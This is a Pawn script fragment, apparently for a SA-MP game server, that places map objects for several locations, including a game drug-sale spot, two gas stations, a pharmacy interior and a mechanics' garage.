	CreateDynamicObject(1557,2528.4100000,-1315.9600000,1030.4100000,0.0000000,0.0000000,-178.9200000); //
	CreateDynamicObject(1714,2527.5300000,-1289.2300000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2198,2528.3700000,-1290.9200000,1030.4200000,0.0000000,0.0000000,-179.9400000); //
	CreateDynamicObject(1502,2525.2400000,-1291.7300000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2516.3800000,-1291.6500000,1034.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3851,2565.6300000,-1293.9500000,1032.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3851,2565.6000000,-1283.1200000,1032.0400000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3851,2565.6000000,-1294.4000000,1038.6800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3851,2565.6000000,-1283.0900000,1038.6800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(983,2534.7100000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2541.1300000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2547.5500000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2553.9700000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2560.4300000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2562.3100000,-1297.6400000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2531.0000000,3836.0000000,-1294.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(983,2531.0000000,4631.0000000,-1294.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(983,2531.5000000,-1294.4500000,1037.3400000,0.0000000,0.0000000,-180.0000000); //
	CreateDynamicObject(983,2531.5000000,-1292.8500000,1037.3400000,0.0000000,0.0000000,-180.0000000); //
	CreateDynamicObject(983,2534.7000000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2541.1000000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2547.5200000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2553.9200000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2560.2800000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(983,2562.2800000,-1289.3000000,1037.3400000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(19456,2561.6400000,-1279.8700000,1028.7100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2544.8400000,-1285.7400000,1036.0400000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(8674,2552.8000000,-1287.8300000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2552.8000000,-1284.9100000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2542.5000000,-1287.8300000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2532.2000000,-1287.8300000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2532.2000000,-1284.9900000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2542.5000000,-1285.0500000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2563.0800000,-1284.9100000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2563.0800000,-1282.0100000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2563.0800000,-1279.0900000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2563.0800000,-1287.8300000,1036.7300000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2560.3500000,-1299.1100000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2560.3500000,-1302.0300000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2560.3500000,-1304.8900000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2560.3300000,-1307.7900000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2550.0800000,-1299.1300000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2550.0800000,-1302.0500000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2539.7800000,-1299.1300000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2539.7800000,-1302.0500000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2529.5000000,-1299.1300000,1036.6900000,-90.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8674,2529.5000000,-1302.0500000,1036.6900000,-90.0000000,0.0000000,0.0000000); //

	//                              VENTA DE DROGA                  //
	CreateDynamicObject(2207,2122.8000488,-2005.9000244,7.0000000,0.0000000,0.0000000,320.0000000); //object(med_office7_desk_1) (1)
	CreateDynamicObject(1575,2123.1999512,-2005.4000244,7.6999998,0.0000000,0.0000000,0.0000000); //object(drug_white) (1)
	CreateDynamicObject(1576,2123.1999512,-2006.3000488,7.6999998,0.0000000,0.0000000,0.0000000); //object(drug_orange) (1)
	CreateDynamicObject(1577,2123.6999512,-2006.6999512,7.6999998,0.0000000,0.0000000,0.0000000); //object(drug_yellow) (1)
	CreateDynamicObject(1578,2124.6000977,-2006.6999512,7.6999998,0.0000000,0.0000000,0.0000000); //object(drug_green) (1)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,6.9000001,0.0000000,0.0000000,0.0000000); //object(drug_blue) (1)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,7.0000000,0.0000000,0.0000000,0.0000000); //object(drug_blue) (2)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,7.0999999,0.0000000,0.0000000,0.0000000); //object(drug_blue) (3)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,7.1999998,0.0000000,0.0000000,0.0000000); //object(drug_blue) (4)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,7.3000002,0.0000000,0.0000000,0.0000000); //object(drug_blue) (5)
	CreateDynamicObject(1579,2122.8000488,-2002.5999756,7.4000001,0.0000000,0.0000000,0.0000000); //object(drug_blue) (6)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,6.9000001,0.0000000,0.0000000,0.0000000); //object(drug_red) (1)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,7.0000000,0.0000000,0.0000000,0.0000000); //object(drug_red) (2)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,7.0999999,0.0000000,0.0000000,0.0000000); //object(drug_red) (3)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,7.1999998,0.0000000,0.0000000,0.0000000); //object(drug_red) (4)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,7.3000002,0.0000000,0.0000000,0.0000000); //object(drug_red) (5)
	CreateDynamicObject(1580,2122.1000977,-2002.3000488,7.4000001,0.0000000,0.0000000,0.0000000); //object(drug_red) (6)
	CreateDynamicObject(823,2109.6000977,-1994.0999756,6.3000002,0.0000000,0.0000000,0.0000000); //object(genveg_tallgrass07) (1)
	CreateDynamicObject(823,2105.5000000,-1997.8000488,6.3000002,0.0000000,0.0000000,0.0000000); //object(genveg_tallgrass07) (2)
	CreateDynamicObject(1438,2124.1999512,-2014.8000488,7.0000000,0.0000000,0.0000000,0.0000000); //object(dyn_box_pile_2) (1)
	CreateDynamicObject(1299,2122.3000488,-2017.5000000,7.4000001,0.0000000,0.0000000,0.0000000); //object(smashboxpile) (1)
	CreateDynamicObject(14600,2130.8000488,-2009.5999756,8.3999996,0.0000000,0.0000000,40.0000000); //object(paperchase_bits2) (1)
	CreateDynamicObject(18249,2139.0000000,-2023.4000244,7.6999998,0.0000000,0.0000000,44.0000000); //object(cuntwjunk05) (1)
	CreateDynamicObject(823,2104.5000000,-1989.5000000,7.0999999,0.0000000,0.0000000,0.0000000); //object(genveg_tallgrass07) (4)
	CreateDynamicObject(823,2101.1999512,-1993.3000488,7.0999999,0.0000000,0.0000000,0.0000000); //object(genveg_tallgrass07) (5)

	//    					Gasolinera Vinewood    //
	CreateDynamicObject(4730,1022.7000122,-885.0000000,45.0999985,0.0000000,0.0000000,26.7500000); //object(billbrdlan2_03) (1)
	CreateDynamicObject(1676,998.9000244,-937.7000122,42.9000015,0.0000000,0.0000000,6.0000000); //object(washgaspump) (1)
	CreateDynamicObject(1676,1001.5999756,-937.2999878,42.9000015,0.0000000,0.0000000,5.9985352); //object(washgaspump) (2)
	CreateDynamicObject(1686,1005.5999756,-936.7000122,41.2999992,0.0000000,0.0000000,90.0000000); //object(petrolpumpnew) (1)
	CreateDynamicObject(1686,1008.7999878,-936.2000122,41.2999992,0.0000000,0.0000000,90.0000000); //object(petrolpumpnew) (2)
	CreateDynamicObject(978,1000.0999756,-936.5000000,42.0000000,0.0000000,0.0000000,8.0000000); //object(sub_roadright) (2)
	CreateDynamicObject(978,1009.2999878,-935.2000122,42.0000000,0.0000000,0.0000000,7.9980469); //object(sub_roadright) (3)
	CreateDynamicObject(978,1009.5999756,-936.9000244,42.0000000,0.0000000,0.0000000,187.9980469); //object(sub_roadright) (4)
	CreateDynamicObject(978,1000.4000244,-938.2000122,42.0000000,0.0000000,0.0000000,187.9925537); //object(sub_roadright) (5)
	CreateDynamicObject(8843,1003.7000122,-940.2000122,41.2000008,0.0000000,0.0000000,96.0000000); //object(arrows01_lvs) (1)
	CreateDynamicObject(8843,1003.9000244,-932.7999878,41.2000008,0.0000000,0.0000000,275.9985352); //object(arrows01_lvs) (2)
	CreateDynamicObject(11417,1008.5000000,-948.0000000,46.0999985,0.0000000,0.0000000,0.0000000); //object(xenonsign2_sfse) (1)
	CreateDynamicObject(13562,1005.2999878,-921.2000122,46.7000008,0.0000000,0.0000000,0.0000000); //object(bigsprunkpole) (1)
	CreateDynamicObject(1244,1012.2999878,-929.2000122,42.0999985,0.0000000,0.0000000,96.0000000); //object(petrolpump) (1)
	CreateDynamicObject(1650,1012.2000122,-928.7000122,43.7000008,0.0000000,0.0000000,10.0000000); //object(petrolcanm) (1)
	CreateDynamicObject(7313,1001.5999756,-946.0000000,45.5999985,0.0000000,0.0000000,8.0000000); //object(vgsn_scrollsgn01) (1)
	CreateDynamicObject(7301,1039.0999756,-929.0999756,45.5999985,0.0000000,0.0000000,323.7500000); //object(vgsn_addboard03) (1)
	CreateDynamicObject(1444,1001.0000000,-927.2999878,42.0999985,0.0000000,0.0000000,100.0000000); //object(dyn_street_sign_2) (1)
	CreateDynamicObject(2599,1000.2999878,-922.2000122,41.7999992,0.0000000,0.0000000,0.0000000); //object(cj_sex_shop_sign) (1)
	CreateDynamicObject(2714,1000.5000000,-917.7999878,45.2999992,0.0000000,0.0000000,280.0000000); //object(cj_open_sign_2) (1)
	CreateDynamicObject(3467,999.7000122,-916.7000122,42.0000000,0.0000000,0.0000000,0.0000000); //object(vegstreetsign1) (1)

	// 								Gasolinera Unity   				//
	CreateDynamicObject(3660,1952.6999512,-1770.0999756,14.0000000,0.0000000,0.0000000,270.0000000); //object(lasairfbed_las) (1)
	CreateDynamicObject(3660,1950.6999512,-1770.0999756,14.0000000,0.0000000,0.0000000,90.0000000); //object(lasairfbed_las) (4)
	CreateDynamicObject(3660,1954.0999756,-1770.0999756,14.0000000,0.0000000,0.0000000,90.0000000); //object(lasairfbed_las) (5)
	CreateDynamicObject(3660,1949.3000488,-1770.0999756,14.0000000,0.0000000,0.0000000,270.0000000); //object(lasairfbed_las) (6)
	CreateDynamicObject(978,1942.5000000,-1767.5999756,13.1999998,0.0000000,0.0000000,270.0000000); //object(sub_roadright) (2)
	CreateDynamicObject(978,1942.5000000,-1776.8000488,13.1999998,0.0000000,0.0000000,270.0000000); //object(sub_roadright) (3)
	CreateDynamicObject(978,1940.8000488,-1776.8000488,13.1999998,0.0000000,0.0000000,90.0000000); //object(sub_roadright) (4)
	CreateDynamicObject(978,1940.8000488,-1767.5000000,13.1999998,0.0000000,0.0000000,90.0000000); //object(sub_roadright) (5)
	CreateDynamicObject(997,1952.0999756,-1760.1999512,12.5000000,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject(997,1947.9000244,-1760.1999512,12.5000000,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (2)
	CreateDynamicObject(994,1948.0000000,-1766.5000000,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (1)
	CreateDynamicObject(994,1948.0000000,-1772.6999512,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (2)
	CreateDynamicObject(994,1948.0000000,-1778.9000244,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (3)
	CreateDynamicObject(997,1948.0999756,-1780.0000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (3)
	CreateDynamicObject(997,1952.0999756,-1780.0000000,12.5000000,0.0000000,0.0000000,0.0000000); //object(lhouse_barrier3) (4)
	CreateDynamicObject(994,1955.4000244,-1780.0999756,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (5)
	CreateDynamicObject(994,1955.4000244,-1773.8000488,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (6)
	CreateDynamicObject(994,1955.4000244,-1767.5000000,12.3999996,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier2) (7)
	CreateDynamicObject(3877,1955.3000488,-1760.5999756,14.3000002,0.0000000,0.0000000,0.0000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1951.5999756,-1760.0999756,14.3000002,0.0000000,0.0000000,0.0000000); //object(sf_rooflite) (2)
	CreateDynamicObject(3877,1948.0999756,-1779.4000244,14.3000002,0.0000000,0.0000000,0.0000000); //object(sf_rooflite) (3)
	CreateDynamicObject(3877,1951.8000488,-1780.0000000,14.3000002,0.0000000,0.0000000,0.0000000); //object(sf_rooflite) (4)
	CreateDynamicObject(11417,1920.6999512,-1763.9000244,17.3999996,0.0000000,0.0000000,270.0000000); //object(xenonsign2_sfse) (1)
	CreateDynamicObject(13562,1926.0999756,-1781.0999756,17.0000000,0.0000000,0.0000000,0.0000000); //object(bigsprunkpole) (1)
	CreateDynamicObject(2780,1912.3000488,-1775.1999512,9.8999996,0.0000000,0.0000000,0.0000000); //object(cj_smoke_mach) (1)
	CreateDynamicObject(2780,1912.6999512,-1778.6999512,9.3999996,0.0000000,0.0000000,0.0000000); //object(cj_smoke_mach) (2)
	CreateDynamicObject(8843,1938.0000000,-1773.0000000,12.3999996,0.0000000,0.0000000,180.0000000); //object(arrows01_lvs) (1)
	CreateDynamicObject(8843,1944.5000000,-1772.6999512,12.3999996,0.0000000,0.0000000,359.9945068); //object(arrows01_lvs) (2)
	CreateDynamicObject(8843,1942.8000488,-1790.1999512,12.3999996,0.0000000,0.0000000,89.9890137); //object(arrows01_lvs) (3)
	CreateDynamicObject(8843,1911.0999756,-1782.5000000,12.3999996,0.0000000,0.0000000,359.9890137); //object(arrows01_lvs) (4)
	CreateDynamicObject(8843,1923.4000244,-1790.4000244,12.3999996,0.0000000,0.0000000,90.0000000); //object(arrows01_lvs) (5)
	CreateDynamicObject(2599,1929.5000000,-1778.1999512,13.0000000,0.0000000,0.0000000,270.0000000); //object(cj_sex_shop_sign) (1)
	CreateDynamicObject(2714,1928.3000488,-1775.0999756,16.5000000,0.0000000,0.0000000,90.0000000); //object(cj_open_sign_2) (1)
	CreateDynamicObject(3337,1950.6999512,-1794.4000244,12.5000000,0.0000000,0.0000000,0.0000000); //object(cxrf_desertsig) (1)
	CreateDynamicObject(3467,1930.4000244,-1785.9000244,13.1999998,0.0000000,0.0000000,40.0000000); //object(vegstreetsign1) (1)
	CreateDynamicObject(3468,1930.0000000,-1781.9000244,13.1999998,0.0000000,0.0000000,90.0000000); //object(vegstreetsign2) (1)
	CreateDynamicObject(4729,1901.0000000,-1778.3000488,22.0000000,0.0000000,0.0000000,20.0000000); //object(billbrdlan2_01) (1)

	//                            FARMACIA (INT)                  	//
	CreateDynamicObject_e(3602,169.8999939,-71.5999985,955.2000122,0.0000000,0.0000000,0.0000000); //object(hillhouse05_la) (1)
	CreateDynamicObject_e(3602,171.1992188,-71.6992188,972.5000000,0.0000000,179.9945068,0.0000000); //object(hillhouse05_la) (2)
	CreateDynamicObject_e(18447,162.1999969,-73.5999985,963.9000244,0.0000000,0.0000000,0.0000000); //object(cs_mntdetail01) (1)
	CreateDynamicObject_e(18447,178.8999939,-73.5999985,963.7999878,0.0000000,0.0000000,0.0000000); //object(cs_mntdetail01) (2)
	CreateDynamicObject_e(18447,178.7998047,-64.0996094,963.7999878,0.0000000,0.0000000,0.0000000); //object(cs_mntdetail01) (3)
	CreateDynamicObject_e(18447,162.1992188,-64.0996094,963.9000244,0.0000000,0.0000000,0.0000000); //object(cs_mntdetail01) (4)
	CreateDynamicObject_e(18447,166.8999939,-63.5000000,963.9000244,0.0000000,0.0000000,270.0000000); //object(cs_mntdetail01) (5)
	CreateDynamicObject_e(18447,176.5000000,-63.5000000,963.9000244,0.0000000,0.0000000,270.0000000); //object(cs_mntdetail01) (6)
	CreateDynamicObject_e(18447,176.3000031,-78.5000000,963.9000244,0.0000000,0.0000000,270.0000000); //object(cs_mntdetail01) (7)
	CreateDynamicObject_e(18447,166.6999969,-78.5000000,963.9000244,0.0000000,0.0000000,270.0000000); //object(cs_mntdetail01) (8)
	CreateDynamicObject_e(1893,175.8999939,-73.1999969,965.7999878,0.0000000,0.0000000,0.0000000); //object(shoplight1) (1)
	CreateDynamicObject_e(1893,166.8999939,-73.3000031,965.7999878,0.0000000,0.0000000,0.0000000); //object(shoplight1) (2)
	CreateDynamicObject_e(1893,166.8000031,-68.8000031,965.7999878,0.0000000,0.0000000,0.0000000); //object(shoplight1) (3)
	CreateDynamicObject_e(1893,176.0000000,-68.3000031,965.7999878,0.0000000,0.0000000,0.0000000); //object(shoplight1) (4)
	CreateDynamicObject_e(2198,162.8999939,-71.3000031,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office2_desk_3) (1)
	CreateDynamicObject_e(2198,177.3000031,-71.3000031,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office2_desk_3) (4)
	CreateDynamicObject_e(2309,177.6999969,-72.5000000,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office_chair2) (1)
	CreateDynamicObject_e(2309,163.3999939,-72.5000000,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office_chair2) (2)
	CreateDynamicObject_e(2198,170.3000031,-71.3000031,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office2_desk_3) (5)
	CreateDynamicObject_e(2309,171.1999969,-72.5999985,962.2000122,0.0000000,0.0000000,0.0000000); //object(med_office_chair2) (3)
	CreateDynamicObject_e(2011,176.1000061,-64.3000031,962.2999878,0.0000000,0.0000000,0.0000000); //object(nu_plant2_ofc) (1)
	CreateDynamicObject_e(2011,166.6000061,-64.1999969,962.2999878,0.0000000,0.0000000,0.0000000); //object(nu_plant2_ofc) (2)
	CreateDynamicObject_e(16012,171.0000000,-63.7000008,963.7000122,0.0000000,0.0000000,0.0000000); //object(des_ntcafe) (1)
	CreateDynamicObject_e(1884,164.0000000,-78.6999969,962.2000122,0.0000000,0.0000000,0.0000000); //object(shop_dblshlf) (1)
	CreateDynamicObject_e(1887,167.0000000,-78.1999969,962.2000122,0.0000000,0.0000000,180.0000000); //object(shop_shelf11) (1)
	CreateDynamicObject_e(1888,169.8999939,-78.1999969,962.2000122,0.0000000,0.0000000,180.0000000); //object(shop_shelf12) (1)
	CreateDynamicObject_e(1889,172.8999939,-78.4000015,962.2000122,0.0000000,0.0000000,0.0000000); //object(shop_dblshlf01) (1)
	CreateDynamicObject_e(1890,175.8000031,-78.4000015,962.2000122,0.0000000,0.0000000,0.0000000); //object(shop_dblshlf02) (1)
	CreateDynamicObject_e(2412,173.0000000,-64.0000000,962.2000122,0.0000000,0.0000000,0.0000000); //object(cj_detector) (1)
	CreateDynamicObject_e(2412,169.8000031,-64.0999985,962.2000122,0.0000000,0.0000000,0.0000000); //object(cj_detector) (2)
	CreateDynamicObject_e(997,164.6999969,-67.1999969,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject_e(997,162.3999939,-67.0999985,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (2)
	CreateDynamicObject_e(997,169.3994141,-67.1992188,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (3)
	CreateDynamicObject_e(997,172.1000061,-67.3000031,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (4)
	CreateDynamicObject_e(997,176.6000061,-67.3000031,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (5)
	CreateDynamicObject_e(997,178.6000061,-67.4000015,962.2000122,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (6)
	CreateDynamicObject_e(3851,173.1999969,-70.6999969,966.9000244,0.0000000,0.0000000,270.0000000); //object(carshowwin_sfsx) (1)
	CreateDynamicObject_e(3851,161.8999939,-70.6999969,966.9000244,0.0000000,0.0000000,270.0000000); //object(carshowwin_sfsx) (2)
	CreateDynamicObject_e(2921,175.5000000,-63.4000015,964.5999756,0.0000000,0.0000000,60.0000000); //object(kmb_cam) (1)
	CreateDynamicObject_e(2921,167.3000031,-63.2999992,964.5999756,0.0000000,0.0000000,129.9963379); //object(kmb_cam) (2)
	CreateDynamicObject_e(2921,168.8000031,-67.5000000,965.7000122,2.7022705,250.1759949,232.4679565); //object(kmb_cam) (3)
	CreateDynamicObject_e(18454,164.0000000,-68.3000031,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (1)
	CreateDynamicObject_e(18454,167.5000000,-68.3000031,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject_e(18454,171.0000000,-68.3000031,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (3)
	CreateDynamicObject_e(18454,174.5000000,-68.3000031,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (4)
	CreateDynamicObject_e(18454,178.0000000,-68.3000031,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (5)
	CreateDynamicObject_e(18454,174.5000000,-77.9000015,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (6)
	CreateDynamicObject_e(18454,171.0000000,-77.9000015,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (7)
	CreateDynamicObject_e(18454,178.0000000,-77.9000015,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (8)
	CreateDynamicObject_e(18454,167.5000000,-77.9000015,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (9)
	CreateDynamicObject_e(18454,164.0000000,-77.9000015,962.2000122,0.0000000,270.0000000,0.0000000); //object(cs_detrok02) (10)
	CreateDynamicObject_e(18454,175.8000031,-70.8000031,961.5000000,0.0000000,0.0000000,270.0000000); //object(cs_detrok02) (11)
	CreateDynamicObject_e(18454,166.1999969,-70.8000031,961.5000000,0.0000000,0.0000000,270.0000000); //object(cs_detrok02) (12)

	//                              MECANICOS                       //
	CreateDynamicObject(3624,1777.00000000,-2039.59960938,17.20000076,0.00000000,0.00000000,90.00000000); //object(nwwarhus) (1)
	CreateDynamicObject(10282,1781.50000000,-2031.19921875,13.50000000,0.00000000,0.00000000,0.00000000); //object(mich_int_sfe) (1)
	CreateDynamicObject(14826,1770.50000000,-2048.19921875,13.19999981,0.00000000,0.00000000,270.00000000); //object(int_kbsgarage2) (1)
	CreateDynamicObject(3077,1770.19921875,-2027.39941406,12.50000000,0.00000000,0.00000000,0.00000000); //object(nf_blackboard) (1)
	CreateDynamicObject(2612,1785.89941406,-2026.09960938,14.69999981,0.00000000,0.00000000,0.00000000); //object(police_nb2) (1)
	CreateDynamicObject(2579,1766.50000000,-2037.39941406,13.39999962,0.00000000,0.00000000,63.99536133); //object(cj_sex_shelf_2) (3)
	CreateDynamicObject(2567,1786.79980469,-2047.59960938,14.50000000,0.00000000,0.00000000,270.00000000); //object(ab_warehouseshelf) (1)
	CreateDynamicObject(3761,1766.59960938,-2048.89941406,14.89999962,0.00000000,0.00000000,0.00000000); //object(industshelves) (1)
	CreateDynamicObject(925,1786.39941406,-2051.29980469,13.69999981,0.00000000,0.00000000,0.00000000); //object(rack2) (1)
	CreateDynamicObject(10282,1773.79980469,-2031.09960938,13.50000000,0.00000000,0.00000000,0.00000000); //object(mich_int_sfe) (2)
	CreateDynamicObject(2290,1769.19921875,-2040.69921875,12.50000000,0.00000000,0.00000000,177.99499512); //object(swk_couch_1) (1)
	CreateDynamicObject(2290,1767.19921875,-2041.79980469,12.50000000,0.00000000,0.00000000,357.98950195); //object(swk_couch_1) (2)
	CreateDynamicObject(2066,1769.19921875,-2036.89941406,12.50000000,0.00000000,0.00000000,0.00000000); //object(cj_m_fileing2) (1)
	CreateDynamicObject(1159,1789.00000000,-2038.50000000,14.30000019,0.00000000,0.00000000,270.00000000); //object(rbmp_a_j) (1)
	CreateDynamicObject(1098,1789.19921875,-2036.89941406,16.00000000,0.00000000,0.00000000,0.00000000); //object(wheel_gn5) (1)
	CreateDynamicObject(1097,1789.19995117,-2038.40002441,15.60000038,0.00000000,0.00000000,178.00000000); //object(wheel_gn4) (1)
	CreateDynamicObject(1096,1789.19995117,-2040.19995117,15.80000019,0.00000000,0.00000000,174.00000000); //object(wheel_gn3) (1)
	CreateDynamicObject(1085,1789.19995117,-2041.59997559,15.50000000,0.00000000,0.00000000,180.00000000); //object(wheel_gn2) (1)
	CreateDynamicObject(1083,1789.19921875,-2040.19921875,14.39999962,0.00000000,0.00000000,177.99499512); //object(wheel_lr2) (1)
	CreateDynamicObject(1080,1789.19921875,-2042.89941406,14.39999962,0.00000000,0.00000000,171.99645996); //object(wheel_sr5) (1)
	CreateDynamicObject(1079,1789.19921875,-2043.00000000,15.80000019,0.00000000,0.00000000,175.99548340); //object(wheel_sr1) (1)
	CreateDynamicObject(1077,1789.19921875,-2044.50000000,15.50000000,0.00000000,0.00000000,179.99450684); //object(wheel_lr1) (1)
	CreateDynamicObject(1075,1789.19995117,-2046.09997559,16.10000038,0.00000000,0.00000000,176.00000000); //object(wheel_sr2) (1)
	CreateDynamicObject(9825,1805.00000000,-2024.89941406,12.39999962,0.99426270,0.24719238,89.99450684); //object(carspaces3_sfw02) (1)
	CreateDynamicObject(8558,1758.39941406,-2073.79980469,14.00000000,0.00000000,0.00000000,179.99450684); //object(vgshseing28) (1)
	CreateDynamicObject(3096,1776.90002441,-2053.60009766,20.29999924,0.00000000,0.00000000,178.50000000); //object(bb_pickup) (1)
	CreateDynamicObject(1236,1805.40002441,-2062.69995117,13.19999981,0.00000000,0.00000000,0.00000000); //object(rcyclbank01) (1)
	CreateDynamicObject(974,1781.40002441,-2018.40002441,15.89999962,0.00000000,0.00000000,0.00000000); //object(tall_fence) (1)
	CreateDynamicObject(997,1788.69995117,-2056.89990234,12.60000038,0.00000000,0.00000000,268.00000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject(997,1782.59997559,-2056.80004883,12.60000038,0.00000000,0.00000000,267.99499512); //object(lhouse_barrier3) (2)
	CreateDynamicObject(997,1783.90002441,-2056.89990234,12.60000038,0.00000000,0.00000000,267.99499512); //object(lhouse_barrier3) (3)
	CreateDynamicObject(1225,1730.80004883,-2056.50000000,14.10000038,0.00000000,0.00000000,0.00000000); //object(barrel4) (1)
	CreateDynamicObject(1225,1730.90002441,-2055.30004883,14.19999981,0.00000000,0.00000000,0.00000000); //object(barrel4) (3)
	CreateDynamicObject(1225,1730.69995117,-2056.39990234,12.50000000,0.00000000,0.00000000,0.00000000); //object(barrel4) (5)
	CreateDynamicObject(1225,1730.90002441,-2055.30004883,12.60000038,0.00000000,0.00000000,0.00000000); //object(barrel4) (6)
	CreateDynamicObject(1225,1731.19995117,-2054.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(barrel4) (7)
	CreateDynamicObject(1225,1734.00000000,-2054.50000000,14.19999981,0.00000000,0.00000000,0.00000000); //object(barrel4) (8)
	CreateDynamicObject(1225,1734.00000000,-2054.39990234,12.60000038,0.00000000,0.00000000,0.00000000); //object(barrel4) (9)
	CreateDynamicObject(2921,1782.00000000,-2053.39990234,16.50000000,0.00000000,0.00000000,0.00000000); //object(kmb_cam) (1)
	CreateDynamicObject(3522,1759.09960938,-2054.09960938,12.60000038,0.24719238,0.00000000,270.00000000); //object(vgsn_flwbdcrb) (1)
	CreateDynamicObject(3522,1765.69995117,-2054.10009766,12.60000038,0.00000000,0.00000000,270.00000000); //object(vgsn_flwbdcrb) (2)
	CreateDynamicObject(939,1731.19995117,-2060.00000000,13.10000038,0.00000000,0.00000000,90.00000000); //object(cj_df_unit) (1)
	CreateDynamicObject(1251,1776.09960938,-2072.00000000,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (4)
	CreateDynamicObject(1251,1768.69995117,-2072.19995117,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (5)
